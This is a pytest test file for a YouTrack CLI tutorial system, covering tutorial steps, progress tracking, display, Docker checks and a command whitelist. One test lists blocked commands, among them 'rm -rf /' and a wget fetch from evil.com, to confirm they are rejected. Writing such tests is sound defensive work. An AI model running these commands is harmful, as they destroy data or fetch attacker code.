"""Tests for tutorial system."""

import tempfile
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest
from docker.errors import DockerException

from youtrack_cli.tutorial.core import TutorialEngine, TutorialModule, TutorialProgress, TutorialStep
from youtrack_cli.tutorial.docker_utils import (
    DockerNotAvailableError,
    PortInUseError,
    check_docker_available,
    check_port_available,
)
from youtrack_cli.tutorial.executor import ClickCommandExecutor
from youtrack_cli.tutorial.modules import DockerTutorial, IssuesTutorial, SetupTutorial, get_default_modules
from youtrack_cli.tutorial.progress import ProgressTracker


class TestTutorialStep:
    """Test TutorialStep functionality."""

    def test_tutorial_step_creation(self):
        """Test creating a tutorial step."""
        step = TutorialStep(
            title="Test Step",
            description="Test description",
            instructions=["Do this", "Do that"],
            command_example="yt test",
            tips=["Tip 1", "Tip 2"],
        )

        assert step.title == "Test Step"
        assert step.description == "Test description"
        assert len(step.instructions) == 2
        assert step.command_example == "yt test"
        assert step.tips is not None and len(step.tips) == 2


class TestTutorialProgress:
    """Test TutorialProgress functionality."""

    def test_tutorial_progress_creation(self):
        """Test creating tutorial progress."""
        progress = TutorialProgress(module_id="test")

        assert progress.module_id == "test"
        assert progress.current_step == 0
        assert progress.completed_steps == []
        assert progress.started_at is None
        assert progress.completed_at is None


class TestTutorialModule:
    """Test TutorialModule functionality."""

    def test_setup_tutorial_creation(self):
        """Test creating setup tutorial."""
        tutorial = SetupTutorial()

        assert tutorial.module_id == "setup"
        assert tutorial.title == "Getting Started with YouTrack CLI"
        assert "authenticate" in tutorial.description.lower()

        steps = tutorial.get_steps()
        assert len(steps) > 0
        assert all(isinstance(step, TutorialStep) for step in steps)

    def test_issues_tutorial_creation(self):
        """Test creating issues tutorial."""
        tutorial = IssuesTutorial()

        assert tutorial.module_id == "issues"
        assert tutorial.title == "Working with Issues"
        assert "create" in tutorial.description.lower()

        steps = tutorial.get_steps()
        assert len(steps) > 0
        assert all(isinstance(step, TutorialStep) for step in steps)

    def test_get_default_modules(self):
        """Test getting default modules."""
        modules = get_default_modules()

        assert len(modules) > 0
        assert all(isinstance(module, TutorialModule) for module in modules)

        module_ids = [module.module_id for module in modules]
        assert "setup" in module_ids
        assert "issues" in module_ids
        assert "projects" in module_ids
        assert "time" in module_ids


class TestProgressTracker:
    """Test ProgressTracker functionality."""

    def test_progress_tracker_creation(self):
        """Test creating progress tracker with temp directory."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)

            assert tracker.config_dir == Path(temp_dir)
            assert tracker.progress_file.parent == Path(temp_dir)

    def test_save_and_load_progress(self):
        """Test saving and loading progress."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)

            # Create and save progress
            progress = TutorialProgress(module_id="test", current_step=2)
            progress.completed_steps = [0, 1]
            tracker.save_progress(progress)

            # Load progress
            loaded_progress = tracker.get_progress("test")
            assert loaded_progress is not None
            assert loaded_progress.module_id == "test"
            assert loaded_progress.current_step == 2
            assert loaded_progress.completed_steps == [0, 1]
            assert loaded_progress.started_at is not None

    def test_reset_progress(self):
        """Test resetting progress."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)

            # Create and save progress
            progress = TutorialProgress(module_id="test", current_step=2)
            tracker.save_progress(progress)

            # Verify progress exists
            assert tracker.get_progress("test") is not None

            # Reset progress
            result = tracker.reset_progress("test")
            assert result is True
            assert tracker.get_progress("test") is None

    def test_completion_stats(self):
        """Test completion statistics."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)

            # Add some progress
            completed_progress = TutorialProgress(module_id="completed")
            completed_progress.completed_at = tracker.get_current_timestamp()
            tracker.save_progress(completed_progress)

            in_progress = TutorialProgress(module_id="in_progress", current_step=1)
            tracker.save_progress(in_progress)

            stats = tracker.get_completion_stats()
            assert stats["completed"] == 1
            assert stats["in_progress"] == 1
            assert stats["total"] == 2


class TestTutorialEngine:
    """Test TutorialEngine functionality."""

    def test_tutorial_engine_creation(self):
        """Test creating tutorial engine."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            assert engine.progress_tracker == tracker
            assert len(engine.modules) == 0

    def test_register_modules(self):
        """Test registering tutorial modules."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Register default modules
            for module in get_default_modules():
                engine.register_module(module)

            assert len(engine.modules) > 0
            assert "setup" in engine.modules
            assert "issues" in engine.modules

            # Test getting modules
            setup_module = engine.get_module("setup")
            assert setup_module is not None
            assert setup_module.module_id == "setup"

            # Test listing modules
            modules = engine.list_modules()
            assert len(modules) == len(engine.modules)

    def test_nonexistent_module(self):
        """Test getting nonexistent module."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            module = engine.get_module("nonexistent")
            assert module is None


class TestTutorialIntegration:
    """Integration tests for tutorial system."""

    def test_full_tutorial_workflow(self):
        """Test complete tutorial workflow."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Setup
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Register modules
            for module in get_default_modules():
                engine.register_module(module)

            # Verify modules are registered
            assert len(engine.modules) > 0

            # Test getting a module
            setup_module = engine.get_module("setup")
            assert setup_module is not None

            # Test module steps
            steps = setup_module.get_steps()
            assert len(steps) > 0

            # Test progress tracking
            progress = TutorialProgress(module_id="setup", current_step=1)
            tracker.save_progress(progress)

            loaded_progress = tracker.get_progress("setup")
            assert loaded_progress is not None
            assert loaded_progress.current_step == 1


class TestTutorialShortcuts:
    """Test tutorial shortcut functionality."""

    def test_action_mapping(self):
        """Test action mapping for shortcuts."""
        action_map = {"n": "next", "r": "repeat", "s": "skip", "q": "quit", "e": "execute"}

        # Test single letter shortcuts (lowercase)
        assert action_map.get("n", "n") == "next"
        assert action_map.get("r", "r") == "repeat"
        assert action_map.get("s", "s") == "skip"
        assert action_map.get("q", "q") == "quit"
        assert action_map.get("e", "e") == "execute"

        # Test full words pass through
        assert action_map.get("next", "next") == "next"
        assert action_map.get("repeat", "repeat") == "repeat"
        assert action_map.get("skip", "skip") == "skip"
        assert action_map.get("quit", "quit") == "quit"
        assert action_map.get("execute", "execute") == "execute"

    def test_choices_generation(self):
        """Test choices generation for prompts."""
        # Base choices
        choices = ["next", "n", "repeat", "r", "skip", "s", "quit", "q"]

        # Verify all basic choices are present
        assert "next" in choices
        assert "n" in choices
        assert "repeat" in choices
        assert "r" in choices
        assert "skip" in choices
        assert "s" in choices
        assert "quit" in choices
        assert "q" in choices

        # Test with execute options
        choices_with_execute = choices + ["execute", "e"]
        assert "execute" in choices_with_execute
        assert "e" in choices_with_execute

    def test_prompt_text_generation(self):
        """Test prompt text generation."""
        # Without execute option
        prompt_text = "What would you like to do? [(n)ext/(r)epeat/(s)kip/(q)uit] (Enter=next)"
        assert "(n)ext/(r)epeat/(s)kip/(q)uit" in prompt_text
        assert "Enter=next" in prompt_text

        # With execute option
        prompt_text_with_execute = "What would you like to do? [(n)ext/(r)epeat/(s)kip/(q)uit/(e)xecute] (Enter=next)"
        assert "(n)ext/(r)epeat/(s)kip/(q)uit/(e)xecute" in prompt_text_with_execute
        assert "Enter=next" in prompt_text_with_execute


class TestTutorialCommandExecution:
    """Test tutorial command execution functionality."""

    def test_step_with_command_example(self):
        """Test step with command example."""
        step = TutorialStep(
            title="Test Step",
            description="Test description",
            instructions=["Run the command"],
            command_example="echo 'hello world'",
        )

        assert step.command_example == "echo 'hello world'"

    @pytest.mark.asyncio
    async def test_command_execution_success(self):
        """Test successful command execution."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Test simple echo command
            await engine._execute_command("echo 'test success'")
            # If no exception is raised, the test passes

    @pytest.mark.asyncio
    async def test_command_execution_failure(self):
        """Test command execution with failure."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Test command that should fail
            await engine._execute_command("nonexistent_command_that_should_fail")
            # If no exception is raised, the test passes (failure is handled gracefully)


class TestTutorialEngineDisplay:
    """Test TutorialEngine display methods."""

    def test_display_welcome(self):
        """Test tutorial welcome message display."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            with patch.object(engine.console, "print") as mock_print:
                engine.display_welcome()

                # Should print welcome panel and blank line
                assert mock_print.call_count == 2  # Panel and empty line
                # First call should be a Panel object
                first_call_args = mock_print.call_args_list[0][0]
                assert len(first_call_args) == 1

    def test_display_module_list_empty(self):
        """Test displaying empty module list."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            with patch.object(engine.console, "print") as mock_print:
                engine.display_module_list()

                # Should print table with no modules
                assert mock_print.called

    def test_display_module_list_with_modules(self):
        """Test displaying module list with registered modules."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Register a module
            setup_module = SetupTutorial()
            engine.register_module(setup_module)

            with patch.object(engine.console, "print") as mock_print:
                engine.display_module_list()

                # Should print table with module information
                assert mock_print.called
                # Should print a Table object
                assert mock_print.call_count == 1

    def test_display_module_list_with_progress(self):
        """Test displaying module list with progress tracking."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Register a module and create progress
            setup_module = SetupTutorial()
            engine.register_module(setup_module)

            # Create in-progress tutorial
            progress = TutorialProgress(module_id="setup", current_step=1)
            tracker.save_progress(progress)

            with patch.object(engine.console, "print") as mock_print:
                engine.display_module_list()

                # Should show progress information
                assert mock_print.called

    def test_display_completion(self):
        """Test tutorial completion message display."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            module = SetupTutorial()

            with patch.object(engine.console, "print") as mock_print:
                engine.display_completion(module)

                # Should print blank line and completion panel
                assert mock_print.call_count == 2


class TestTutorialModuleDisplay:
    """Test TutorialModule display methods."""

    def test_display_intro(self):
        """Test tutorial module introduction display."""
        module = SetupTutorial()

        with patch.object(module.console, "print") as mock_print:
            module.display_intro()

            # Should print introduction panel and blank line
            assert mock_print.call_count == 2

    def test_display_step_basic(self):
        """Test displaying a basic tutorial step."""
        module = SetupTutorial()
        step = TutorialStep(
            title="Test Step",
            description="Test description",
            instructions=["Do this", "Do that"],
        )

        with patch.object(module.console, "print") as mock_print:
            module.display_step(step, 1, 5)

            # Should print step header, description, instructions, and empty line
            assert (
                mock_print.call_count > 3
            )  # At least header, description, instructions label, instructions, empty line

    def test_display_step_with_command_example(self):
        """Test displaying tutorial step with command example."""
        module = SetupTutorial()
        step = TutorialStep(
            title="Test Step",
            description="Test description",
            instructions=["Run the command"],
            command_example="yt issues list",
        )

        with patch.object(module.console, "print") as mock_print:
            module.display_step(step, 2, 3)

            # Should print more content including command example
            assert mock_print.call_count > 5  # More prints for command example

    def test_display_step_with_tips(self):
        """Test displaying tutorial step with tips."""
        module = SetupTutorial()
        step = TutorialStep(
            title="Test Step",
            description="Test description",
            instructions=["Do this"],
            tips=["Tip 1", "Tip 2", "Tip 3"],
        )

        with patch.object(module.console, "print") as mock_print:
            module.display_step(step, 1, 1)

            # Should print step with tips
            assert mock_print.called
            printed_content = str(mock_print.call_args_list)
            assert "Tips" in printed_content
            assert "Tip 1" in printed_content

    def test_display_step_complete(self):
        """Test displaying tutorial step with all components."""
        module = SetupTutorial()
        step = TutorialStep(
            title="Complete Step",
            description="Complete step description",
            instructions=["First instruction", "Second instruction"],
            command_example="yt auth login",
            tips=["Remember your password", "Use a secure connection"],
        )

        with patch.object(module.console, "print") as mock_print:
            module.display_step(step, 3, 10)

            # Should print many components (header, description, instructions, command, tips)
            assert mock_print.call_count > 8  # Many print calls for all components


class TestTutorialEngineExecution:
    """Test TutorialEngine execution methods."""

    @pytest.mark.asyncio
    async def test_execute_step_action_success(self):
        """Test successful step action execution."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Create step with successful action
            async def mock_action():
                return True

            def mock_validation():
                return True

            step = TutorialStep(
                title="Test Step",
                description="Test description",
                instructions=["Do something"],
                execute_action=mock_action,
                validation_check=mock_validation,
            )

            with patch.object(engine.console, "print") as mock_print:
                result = await engine._execute_step_action(step, 1)

                assert result is True
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_execute_step_action_validation_failure(self):
        """Test step action execution with validation failure."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Create step with failing validation
            async def mock_action():
                return True

            def mock_validation():
                return False

            step = TutorialStep(
                title="Test Step",
                description="Test description",
                instructions=["Do something"],
                execute_action=mock_action,
                validation_check=mock_validation,
            )

            with patch.object(engine.console, "print") as mock_print:
                result = await engine._execute_step_action(step, 1)

                assert result is False
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_execute_step_action_exception(self):
        """Test step action execution with exception."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Create step with failing action
            async def mock_action():
                raise ValueError("Action failed")

            step = TutorialStep(
                title="Test Step",
                description="Test description",
                instructions=["Do something"],
                execute_action=mock_action,
            )

            with patch.object(engine.console, "print") as mock_print:
                result = await engine._execute_step_action(step, 1)

                assert result is False
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_execute_step_action_no_validation(self):
        """Test step action execution without validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Create step without validation
            async def mock_action():
                return True

            step = TutorialStep(
                title="Test Step",
                description="Test description",
                instructions=["Do something"],
                execute_action=mock_action,
            )

            with patch.object(engine.console, "print") as mock_print:
                result = await engine._execute_step_action(step, 1)

                assert result is True
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_run_module_nonexistent(self):
        """Test running a nonexistent tutorial module."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            with patch.object(engine.console, "print") as mock_print:
                result = await engine.run_module("nonexistent")

                assert result is False
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_run_module_no_steps(self):
        """Test running a module with no steps."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Create empty module
            class EmptyModule(TutorialModule):
                def create_steps(self):
                    return []

            empty_module = EmptyModule("empty", "Empty Module", "No steps")
            engine.register_module(empty_module)

            with patch.object(engine.console, "print") as mock_print:
                result = await engine.run_module("empty")

                assert result is False
                assert mock_print.called

    @pytest.mark.asyncio
    async def test_run_module_user_cancels(self):
        """Test running module when user cancels at start."""
        with tempfile.TemporaryDirectory() as temp_dir:
            tracker = ProgressTracker(config_dir=temp_dir)
            engine = TutorialEngine(tracker)

            # Register module with steps
            setup_module = SetupTutorial()
            engine.register_module(setup_module)

            with patch("youtrack_cli.tutorial.core.Confirm.ask", return_value=False):
                with patch.object(engine.console, "print") as mock_print:
                    result = await engine.run_module("setup")

                    assert result is False
                    assert mock_print.called


class TestTutorialStepAdvanced:
    """Test advanced TutorialStep functionality."""

    def test_tutorial_step_with_custom_prompt(self):
        """Test tutorial step with custom prompt choices."""
        step = TutorialStep(
            title="Custom Step",
            description="Step with custom choices",
            instructions=["Choose an option"],
            custom_prompt_choices=["option1", "option2", "option3"],
            custom_prompt_handler=AsyncMock(),
        )

        assert step.custom_prompt_choices == ["option1", "option2", "option3"]
        assert step.custom_prompt_handler is not None

    def test_tutorial_step_with_cleanup(self):
        """Test tutorial step with cleanup action."""
        cleanup_mock = Mock()
        step = TutorialStep(
            title="Cleanup Step",
            description="Step with cleanup",
            instructions=["Do something"],
            cleanup_action=cleanup_mock,
        )

        assert step.cleanup_action == cleanup_mock

    def test_tutorial_step_validation_command(self):
        """Test tutorial step with validation command."""
        step = TutorialStep(
            title="Validation Step",
            description="Step with validation",
            instructions=["Run validation"],
            validation_command="yt auth status",
        )

        assert step.validation_command == "yt auth status"


class TestTutorialModuleAdvanced:
    """Test advanced TutorialModule functionality."""

    def test_add_step(self):
        """Test adding steps to tutorial module."""
        module = SetupTutorial()

        # Clear existing steps
        module.steps = []

        step1 = TutorialStep("Step 1", "First step", ["Do this"])
        step2 = TutorialStep("Step 2", "Second step", ["Do that"])

        module.add_step(step1)
        module.add_step(step2)

        assert len(module.steps) == 2
        assert module.steps[0] == step1
        assert module.steps[1] == step2

    def test_get_steps_caching(self):
        """Test that get_steps caches the result."""
        module = SetupTutorial()

        # First call creates steps
        steps1 = module.get_steps()

        # Second call should return cached steps
        steps2 = module.get_steps()

        assert steps1 is steps2
        assert len(steps1) > 0


# === CONSOLIDATED DOCKER TUTORIAL TESTS ===


class TestDockerUtils:
    """Test Docker utility functions."""

    @patch("youtrack_cli.tutorial.docker_utils.docker.from_env")
    def test_check_docker_available_success(self, mock_docker):
        """Test successful Docker availability check."""
        mock_client = Mock()
        mock_docker.return_value = mock_client

        check_docker_available()

        mock_client.ping.assert_called_once()

    @patch("youtrack_cli.tutorial.docker_utils.docker.from_env")
    def test_check_docker_available_failure(self, mock_docker):
        """Test Docker availability check failure."""
        mock_docker.side_effect = DockerException("Docker not available")

        with pytest.raises(DockerNotAvailableError):
            check_docker_available()

    @patch("socket.socket")
    def test_check_port_available_success(self, mock_socket):
        """Test port availability check success."""
        mock_sock = Mock()
        mock_socket.return_value.__enter__.return_value = mock_sock
        mock_sock.bind.return_value = None  # bind succeeds (port is free)

        check_port_available(8080)  # Should not raise exception

    @patch("socket.socket")
    def test_check_port_available_failure(self, mock_socket):
        """Test port availability check failure."""
        mock_sock = Mock()
        mock_socket.return_value.__enter__.return_value = mock_sock
        mock_sock.bind.side_effect = OSError("Address already in use")

        with pytest.raises(PortInUseError):
            check_port_available(8080)


class TestDockerTutorial:
    """Test Docker tutorial module."""

    @patch("youtrack_cli.tutorial.modules.cleanup_youtrack_resources")
    def test_cleanup_resources(self, mock_cleanup):
        """Test cleanup resources method."""
        tutorial = DockerTutorial()
        tutorial.cleanup_resources(remove_data=True)

        mock_cleanup.assert_called_once_with(remove_data=True)


# === CONSOLIDATED TUTORIAL EXECUTOR TESTS ===


class TestClickCommandExecutor:
    """Test cases for ClickCommandExecutor."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config_manager = MagicMock()
        self.executor = ClickCommandExecutor(self.config_manager)

    def test_init(self):
        """Test executor initialization."""
        assert self.executor.config_manager == self.config_manager
        assert self.executor.console is not None
        assert self.executor.auth_manager is not None
        assert len(self.executor.allowed_commands) > 0

    def test_is_command_allowed_basic_commands(self):
        """Test command whitelist validation for basic commands."""
        assert self.executor.is_command_allowed("yt --help")
        assert self.executor.is_command_allowed("yt projects list")
        assert self.executor.is_command_allowed("yt issues create FPU 'Test issue'")
        assert self.executor.is_command_allowed("yt auth login")
        assert self.executor.is_command_allowed("source .env.local && yt projects list")

    def test_is_command_allowed_blocked_commands(self):
        """Test command whitelist validation for blocked commands."""
        assert not self.executor.is_command_allowed("rm -rf /")
        assert not self.executor.is_command_allowed("curl malicious-site.com")
        assert not self.executor.is_command_allowed("wget http://evil.com/script.sh")
        assert not self.executor.is_command_allowed("python -c 'import os; os.system(\"rm -rf /\")'")
        assert not self.executor.is_command_allowed("arbitrary_command")

    def test_parse_command_basic(self):
        """Test basic command parsing."""
        args = self.executor.parse_command("yt projects list")
        assert args == ["projects", "list"]

    def test_tutorial_command_whitelist_coverage(self):
        """Test that security whitelist covers common tutorial commands."""
        common_tutorial_commands = [
            "yt --help",
            "yt projects list",
            "yt issues list",
            "yt auth status",
            "yt tutorial list",
            "source .env.local && yt projects list",
        ]

        for command in common_tutorial_commands:
            assert self.executor.is_command_allowed(command), f"Command should be allowed: {command}"
